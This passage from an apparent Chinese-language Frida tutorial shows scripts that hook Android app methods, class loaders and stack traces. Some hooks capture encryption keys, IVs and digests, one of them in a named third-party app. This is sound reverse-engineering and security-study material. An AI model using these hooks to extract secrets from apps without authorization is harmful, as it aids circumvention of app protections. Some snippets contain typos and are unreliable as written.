class="string">&quot;com.ilulutv.fulao2.other.i.b&quot;</span>).<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">key, iv, image</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">b</span>(key, iv, image);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key&quot;</span>, base64.<span class="title function_">encodeToString</span>(key, <span class="number">0</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;iv&quot;</span>, base64.<span class="title function_">encodeToString</span>(iv, <span class="number">0</span>));</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">UtilsClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.kevin.app.Utils&quot;</span>);</span><br><span class="line">        <span class="comment">// 重载无参方法</span></span><br><span class="line">        <span class="title class_">UtilsClass</span>.<span class="property">test</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook overload no args&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">test</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 重载有参方法 - 基础数据类型</span></span><br><span class="line"><span class="title class_">UtilsClass</span>.<span class="property">test</span>.<span class="title function_">overload</span>(<span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">num</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook overload int args&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> myNum = <span class="number">9999</span>;</span><br><span class="line">            <span class="keyword">var</span> oriResult = <span class="variable language_">this</span>.<span class="title function_">test</span>(num);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;oriResult is :&quot;</span> + oriResult);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">test</span>(myNum);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 重载有参方法 - 引用数据类型</span></span><br><span class="line">        <span class="title class_">UtilsClass</span>.<span class="property">test</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.kevin.app.Money&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">money</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hook Money args&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">test</span>(money);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// hook 指定方法的所有重载</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">ClassName</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Utils&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> overloadsLength = <span class="title class_">ClassName</span>.<span class="property">test</span>.<span class="property">overloads</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadsLength; i++)&#123;</span><br><span class="line">            <span class="title class_">ClassName</span>.<span class="property">test</span>.<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="comment">// 遍历打印 arguments </span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> a = <span class="number">0</span>; a &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; a++)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(a + <span class="string">&quot; : &quot;</span> + <span class="variable language_">arguments</span>[a]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 调用原方法</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">test</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6-Hook内部类-匿名类-枚举类"><a href="#6-Hook内部类-匿名类-枚举类" class="headerlink" title="6. Hook内部类&amp;匿名类&amp;枚举类"></a>6. Hook内部类&amp;匿名类&amp;枚举类</h2><h3 id="内部类"><a href="#内部类" class="headerlink" title="内部类$"></a>内部类$</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perfor</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// hook 内部类</span></span><br><span class="line">        <span class="comment">// 内部类使用$进行分隔 不使用.</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">InnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.Money$innerClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 重写内部类的 $init 方法</span></span><br><span class="line">        <span class="title class_">InnerClass</span>.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>,<span class="string">&quot;int&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;x: &quot;</span>,x);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;y: &quot;</span>,y);</span><br><span class="line">            <span class="variable language_">this</span>.$init(x,y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h3 id="匿名类-1"><a href="#匿名类-1" class="headerlink" title="匿名类$1"></a>匿名类$1</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口, 抽象类, 不可以被new</span></span><br><span class="line"><span class="comment">// 接口, 抽象类 要使用必须要实例化, 实例化不是通过new, 而是通过实现接口方法, 继承抽象类等方式</span></span><br><span class="line"><span class="comment">// new __接口__&#123;&#125; 可以理解成 new 了一个实现接口的匿名类, 在匿名类的内部(花括号内),实现了这个接口</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// hook 匿名类</span></span><br><span class="line">        <span class="comment">// 匿名类在 smail中以 $1, $2 等方式存在, 需要通过 java 行号去 smail 找到准确的匿名类名称 </span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">NiMingClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.xiaojianbang.app.MainActivity$1&quot;</span>);</span><br><span class="line">        <span class="title class_">NiMingClass</span>.<span class="property">getInfo</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;kevin change 匿名类&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><h3 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enumPrint</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.r0ysue.a0526printout.Signal&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;,</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;find it ,&#x27;</span>,instance);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(instance.<span class="property">class</span>.<span class="title function_">getName</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-Hook动态加载类enumerateClassLoaders"><a href="#7-Hook动态加载类enumerateClassLoaders" class="headerlink" title="7. Hook动态加载类enumerateClassLoaders"></a>7. Hook动态加载类enumerateClassLoaders</h2><p>对于调用时动态加载的类，遍历ClassLoader然后找到能加载该类的ClassLoader；然后将Frida的默认classloader为设置为找到的这个ClassLoader；再使用<code>Java.use</code>来加载该类</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 枚举内存中的 类加载器</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">    <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 如果找到的类加载器 能加载的类有[class_name]</span></span><br><span class="line">            <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;[class_name]&quot;</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully found loader&quot;</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">                <span class="comment">// 设置 java默认的classloader</span></span><br><span class="line">                <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(error)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;find error:&quot;</span> + error)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;End&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 再 使用该类</span></span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;[class_name]&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="2和7的区别"><a href="#2和7的区别" class="headerlink" title="2和7的区别"></a>2和7的区别</h4><p><code>Java.enumerateClassLoaders</code>和<code>Java.enumerateLoadedClasses</code>的区别：</p><p><strong>Java.enumerateClassLoaders</strong></p><ul><li>目的：这个函数用于枚举所有当前活跃的 Java 类加载器（ClassLoaders）。</li><li>返回值：它返回一个包含类加载器实例的数组。</li><li>使用场景：当你需要获取对特定类加载器的引用，以进一步操作类加载器（例如，查找它加载的类、定义新类或查找资源）时，这个函数非常有用。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(loader);</span><br><span class="line">            <span class="comment">// 可以使用 loader.findClass(name) 来查找类，或者使用其他类加载器相关的方法。</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Enumerated all class loaders.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Java.enumerateLoadedClasses</strong></p><ul><li>目的：这个函数用于枚举由所有活跃的类加载器加载的所有 Java 类。</li><li>返回值：它不会直接返回类实例的数组，而是通过回调函数 <code>onMatch</code> 提供类名。</li><li>使用场景：当你需要获取当前运行时环境中所有加载的类的列表时，这个函数非常有用。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">        <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">className</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(className);</span><br><span class="line">            <span class="comment">// 可以使用 Java.use(className) 来获取类的引用。</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Enumerated all loaded classes.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>主要区别</strong>：</p><ul><li>操作对象：<code>enumerateClassLoaders</code> 操作的是类加载器实例，而 <code>enumerateLoadedClasses</code> 操作的是由这些类加载器加载的类。</li><li>使用方式：<code>enumerateClassLoaders</code> 通常用于当你需要更细粒度的控制，比如加载自定义类或访问特定类加载器的资源时。<code>enumerateLoadedClasses</code> 则用于当你需要列出所有已加载的类时。</li><li>返回值：<code>enumerateClassLoaders</code> 返回类加载器实例，<code>enumerateLoadedClasses</code> 则通过回调函数提供类名。</li></ul><p>在许多情况下，你可能需要结合使用这两个函数，首先枚举类加载器，然后对每个类加载器使用 <code>findClass</code> 方法来查找特定的类或枚举它们加载的所有类。</p><h2 id="8-Frida打印栈回溯"><a href="#8-Frida打印栈回溯" class="headerlink" title="8. Frida打印栈回溯"></a>8. Frida打印栈回溯</h2><p><strong>Exception类抛出异常</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStack</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = <span class="title class_">Exception</span>.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.<span class="title function_">getStackTrace</span>();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.<span class="title function_">toString</span>();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.<span class="title function_">replace</span>(<span class="regexp">/,/g</span>, <span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(replaceStr);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            <span class="title class_">Exception</span>.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Log类Throwable()&amp;Exception</strong></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">printStacks</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====== printStacks start ====== &quot;</span> + name + <span class="string">&quot;==============================&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sample 1</span></span><br><span class="line">    <span class="keyword">var</span> throwable = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(throwable);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sample 2</span></span><br><span class="line">    <span class="keyword">var</span> exception = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new());</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(exception);</span><br><span class="line">    </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====== printStacks end ======== &quot;</span> + name + <span class="string">&quot;==============================&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这块也可以针对特定函数，来打印它的调用栈。</p><p>这块对 HookObject类中的 stringTwo函数进行hook：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407131950303.png" alt="image.png"> </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">HookedObject</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;om.forgotten.fridatestapp.HookedObject&quot;</span>);</span><br><span class="line">        <span class="title class_">HookedObject</span>.<span class="property">stringTwo</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">arg</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="title function_">stringTwo</span>(arg);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//方法一</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);  <span class="comment">//这块定义一下异常类</span></span><br><span class="line">            <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new(<span class="string">&quot;StackTrace&quot;</span>);  <span class="comment">//捕获异常类的构造函数</span></span><br><span class="line">            <span class="keyword">var</span> straces = e.<span class="title function_">getMessage</span>();   <span class="comment">//打印构造函数中初始化的参数,返回值是一个数组</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(straces.<span class="title function_">toString</span>())</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Log</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>);   <span class="comment">//定义一下log类</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Throwable</span> = java.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>);  <span class="comment">//定义异常类Throwable</span></span><br><span class="line">            <span class="keyword">var</span> t = <span class="title class_">Throwable</span>.$new();   <span class="comment">//捕获异常类的构造函数</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;StackTrace2&quot;</span>,<span class="title class_">Log</span>.<span class="title function_">getStackTraceString</span>(t));   <span class="comment">//打印堆栈</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">//方法三</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Log</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>);   <span class="comment">//定义一下log类</span></span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Exception</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>);  <span class="comment">//这块定义一下异常类</span></span><br><span class="line">            <span class="keyword">var</span> e = <span class="title class_">Exception</span>.$new(<span class="string">&quot;StackTrace&quot;</span>);  <span class="comment">//捕获异常类的构造函数</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;StackTrace3&quot;</span>,<span class="title class_">Log</span>.<span class="title function_">getStackTraceString</span>(e));   <span class="comment">//打印堆栈</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="9-请求调用栈"><a href="#9-请求调用栈" class="headerlink" title="9. 请求调用栈"></a>9. 请求调用栈</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> class_Socket = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.net.Socket&quot;</span>);</span><br><span class="line">class_Socket.<span class="property">getOutputStream</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">send</span>(<span class="string">&quot;getOutputSteam&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getOutputStream</span>();</span><br><span class="line">    <span class="keyword">var</span> bt = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new();</span><br><span class="line">    )</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Backtrace:&quot;</span> + bt);</span><br><span class="line">    <span class="title function_">send</span>(result);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="10-常见算法hook"><a href="#10-常见算法hook" class="headerlink" title="10. 常见算法hook"></a>10. 常见算法hook</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> secretKeySpec = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.spec.SecretKeySpec&#x27;</span>);</span><br><span class="line">    secretKeySpec.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.$init(a, b);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;算法名：&quot;</span> + b + <span class="string">&quot;|Dec密钥:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;算法名：&quot;</span> + b + <span class="string">&quot;|Hex密钥:&quot;</span> + <span class="title function_">bytesToHex</span>(a));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> mac = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;javax.crypto.Mac&#x27;</span>);</span><br><span class="line">    mac.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">update</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a))</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">update</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">update</span>(a, b, c)</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;update:&quot;</span> + <span class="title function_">bytesToString</span>(a) + <span class="string">&quot;|&quot;</span> + b + <span class="string">&quot;|&quot;</span> + c);</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">doFinal</span>.<span class="title function_">overload</span>().<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    mac.<span class="property">doFinal</span>.<span class="title function_">overload</span>(<span class="string">&#x27;[B&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">doFinal</span>(a);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal参数:&quot;</span> + <span class="title function_">bytesToString</span>(a));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToHex</span>(result));</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;doFinal结果:&quot;</span> + <span class="title function_">bytesToBase64</span>(result));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> md = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.MessageDigest&#x27;</span>);</span><br><span class="line">    md.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="title function_">showStacks</span>();</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">        <span class="title function_">send</span>(<span class="string">&quot;算法名：&quot;</span> + a);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">getInstance</span>(a, b);</span><br><span class="line">    &#125;</span><br><span class="line">    md.<span class="property">getInstance</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="title 